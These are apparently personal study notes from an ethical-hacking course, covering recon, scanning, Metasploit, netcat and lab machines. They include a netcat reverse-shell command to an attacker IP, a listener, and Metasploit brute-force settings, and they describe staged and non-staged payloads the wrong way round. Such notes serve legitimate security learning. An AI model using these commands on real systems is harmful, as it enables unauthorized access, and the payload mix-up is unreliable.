# Penetration Testing /Ethical Hacking



## Pentesting Tools and Softwares


 **Engagement**
- It is the act of hacking into a company's netework after obtaining permission. It has 5 stages

1. Planning and Reconnaissance /information gathering
2. Scanning
3. Exploitation
4. Post Exploitation
5. Reporting


## Planning and prep for attack


- **Types of Pen Testing**

1. `No view` or `black box` hacking into a company's network by using public internet only tools - detects exposed and visible vulnerability

2. `full view` The company gives full knowlege of the network 

3. `partial view` or `grey box`  testing in house system of network administrator

- **Attack Prep or Reconnaissance**

It can be active (directly engaging with the target system) or passive (Gaining information w/o actively engaging with the system) 

## Common tasks of a pentester

- External/Internal Network
- Web Application
- Wireless - Evaluation of the wireless network
- Physical (Go on site and try to break into the building)/Social/Phishing
- SOC("Purple Teaming") Attacker is read, defender- Its red team vs blue team- called purple teaming assessments- The cat an mouse game
- Report writing

## Useful softwares
 - KeepNote to take notes
 - Green shot or flame shot
 - cherry tree

 ## Networking background

- `ipconfig` for windows `ifconfig`
- NAT
- Media access control (MAC) is the physical address of a device and is in layer 2/ and with switches. 
- The IP addresses are in layer 3. Anythig using a network interface will have a MAC address

## Installations

- Kali linux : 
- VM ware for windows
- 7 zip

- configure virtual machine- VM ware, assign 4GB ram and then select NAT as the network adapter

shortcuts, double tab, ~/
    `ls -la` will reveal hidden folders
    `ls -la` /tmp/  for checking the permissions of the file inside the temp folder
    `chmod 777 filename.txt` or chmod +x filename.txt giving full read wrtie access
- `cat /etc/passwd`
to change password I can type passwd in the terminal
adding a user to sudoers

    `ifconfig` linux
    `iwconfig`  wireless
    `ipconfig`  windows

- Network commands
   ` ping`
   ` arp -a` associating the ip addresses with mac addresses
`netstat -ano` list all the active connections running on the machine- Is the machine talking to someone else and which ports
- route tells were the traffic exit
ifconfig alternative is ip:
- `ip a`
- `ip n`
- `ipr`

- Updating softwares
-   apt update && apt upgrade
-  ` apt install python3-pip`

- install pimp upgrate from cloning a github repository in the 
- cd /opt
- git clone https://github.com/Dewalt-arch/pimpmykali.git
- ./pimpmykali.sh

if gedit gives an error then use.
`xhost local:` or `xhost +SI:localuser:root` , the later only fixes the issue for a root user

`ping 192.168.13.2 -c 1 > ip.txt ` - pings one time and then stores in a file
`cat ip.txt | grep "64 bytes"` - This will tell me that the data is being able to be received after ping- so those ip addresses maybe active or accible. 
`cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"` here tr trauncates at the level of first :, d is delimiter whch in this case is the space and then we are selecting the 4th time his delimiter is used


## Phyton3

```python


```
## Information gathering

`www.bugcrowd.com` - finding websites to hack who would pay you
`hunter.io` gives insights regarding the email password
Heath adams searching the company for datadump from dark web of usernames
`The harvester` - its built into the Kali linux - It searches information in google
`sublist3r` app that can be installed: Aids with Searching the subdomains: It is similar to the harvester, but more comprehensive and it is not a built in program. It has to be harvested, for example if i type `sublist3r -d tesla.com -t 100` threadng
Certificate fingerprinting - This also provides information regaring the domains- It can also provide information regaring the sub-sub-domains
`owasp amass` - can be downloaded using a github repository
tomnomnom httpprobe
`biltwith.com` info regarding the web technoligies related to the website 
`wapalyzer` very neat tool gives a nice overview about a website
`whatweb` - built in Kali linux tools. www.tesla.com
`Burp suite` - has capability of intercepting web traffic anoher tool foxy proxy, we can change the request parameters and then examin the response
goole fu, `site:tesla.com -www filetype:pdf`
Utilizing social media

## Scanning and enumeration

www.vulnhub.com. VULNHUB - you can download a vulnerable virtual machine and then load it into VMware and then practice attacking - has various levels of vulnerable machines
kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
- Finding actively running machines and their ip addresses. `ifconfig`  then `netdiscover -r <ip address with subnet>`
`SYN SYNACK ACK nmap sS` - stelth scanning (used to be undectable, but these days the scanning is detectable) the stealthiness is the trick of faking a connection, but then not establishing one. 
- Modification: SYN SYNACK RST - this specification is a trick to reveal port, but not establishing a connection. 
`nmap -T4 -p- -A <ipaddress>` T4 is speed (max 5- might miss some things) -p- means scanning all ports, but if you leave this out then it means that it will scan top 1000 ports I can also specify certain ports if I like for example -p 80,443. -A tell me everything (OS detection, version detection, script scanning and trace route). Not that even if its not typed in the command `-sS`  (stelth scan for TCP) is automatically included
    Note that -A is the real speed killer here as it is checking for all the versions
`nmap -sU -T4 -p- -A <ipaddress>`  - sU is for scanning UDP
nmap can be used for script scaning, OS detection - other options: version detection, script scanning and trace route if I select -A - it will do all these functions, but is slow. We can also specify the ports. 
- We want to look at what ports are open and whats running on these open ports

- **Things to look for when you have run the scan**
- Look for open ports
- anonymous FTP allowed?
- versions for exploitation such as SAMBA
- If SSH is open then if you attack it then the company should be able to detect it, attacking SSH makes you noisy. If the blue team of the company is unable to detect then their defences are likely very weak
- OS guesses, may not be accurate initially- you can confirm this after you are able to gain access

**Other methods of scanning**
- One method is shown above
- massscan


**Enumerating ports**
- Can start with investigating on ports 80, 443, 139
- A tool nikto - It is a web vulnerability scanner - It can also backfire sometimes because if the company's website uses advance security features, it can autoblock
- `nikto -h http://192.168.57.134`. When this scan is run, it will list out a bunch of vulnerabilities. Save the scan findings into a text file
- `dirbuster, gobuster` - this has a list of directories and will scan to detect them. Some of these softwares are built in Kali linux. It can also scan the files. I can use this in conjunction with` burp suite` to intercept traffic. We are looking for what services are being run and what are the versions of the softwares installed. 

Response codes: `200` ok, `400` error, `500` server error, `300` is redirect

- SMB. SMB is a file share. Manages uploading, DL files or sharing files with co-workers. It is important to know what type of SMB version is being used
- **Metasploit**- run `msfconsole` in terminal- exploitation framework. Does exploits, **auxillary stuff(exploitation and enumeration)** - It is built into Kali linux
    Rhosts - target address, `set RHOSTS 192.168.57.139`and then `run` This refers fo remote hosts, hosts are the individual machines in the network
    Lhosts
- **Smbclient** - it attempts to connect with file sharing using anonymous access `smbclient -L \\\\<ip address>\\` Once it shows the folders that can be connected to then you can connect to them, and it will be like connecting using anomalous ip and then using terminal

- connecting to ssh `ssh <ipaddress>` -oKexAlgorithms. We will attempt to connect- goal is to see if there is a banner that can have some information

- Once you identify the vulnerabilities then these can be exploited by searching in google. Basically what you will find is the code on the web that is written to exploit a particular vulnerability

- Another terminal command `searchsploit` What this does is search for the scripts and then downloads. It should not be very specific. This is an additional tool in addition to google

**Additional scanning tools**
- Masscan - scan theentire internet quickly. It is built in. We can also scan specific ports: `massscan -p1-65535 <ip address>`

## Exploitation

- **Metasploit COmmands**
- `msfconsole`
- `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
- `sysinfo` This will tell us about the system that we have hacked into

- There are a bunch of commands that we can run with metasploit like after typing gaining access with metasploit I can type 'help" and under the networking section there will be commands that you can run. 


- Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
- Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
- Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
- poping a shell means gaining access to a machine

**Reverse Shell**
-`nc -nvlp 444` attack box (lvp means listening verbose port)
-`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
- Whenever a victim connects back to 

**Bin shell**
- You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat

**Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
- Windows type
- Linux type
- Meterpreter
- python

- It is important to know the staged vs non-staged. If one does not work, try the other
- **Staged**- sends all shellcode at once- might not always work `windows/meterpreter_reverse_tcp`
- **Non-staged**- sends the code in stages, is less stable `windows/meterpreter/reverse_tcp

- we can use metasploit or also send exploits manually. One option is openfuck https://github.com/heltonWernik/OpenLuck

**Brute force attack**
- using metasploit : `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt` and then `set rhosts <ip address>` - this is for setting up rhost we can also `set threads 10` `set verbose true` 
- One purpose of a brute force attack is to determine whether the blue team at 

**Credential stuffing**

- foxy proxy - install to firefox


## Hack the box

- **Machine Legacy**

- `nmap -T4 -p- -A <ipaddress>`
    Gives back open ports - basically file sharing, OS version, hostname, Mac address,  smb_version?
- `search smb_version`